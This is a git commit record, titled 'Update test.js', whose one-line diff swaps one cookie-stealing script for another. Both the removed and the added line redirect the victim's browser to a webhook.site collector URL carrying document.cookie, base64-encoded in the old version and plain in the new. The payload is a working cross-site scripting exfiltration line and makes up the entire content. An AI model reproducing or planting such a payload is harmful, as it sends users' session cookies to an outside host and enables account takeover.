23be57c421b74ded1bc1d7dc6e23935b6ddf0776
zkvlkat <132288380+zkvlkat@users.noreply.github.com>
2024-04-14 14:15:20 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-window.location="https://webhook.site/01c6d014-db58-4fa1-b0d3-3b675b6f5131/"+btoa(document.cookie);
+location.href="https://webhook.site/01c6d014-db58-4fa1-b0d3-3b675b6f5131/?param="+document.cookie
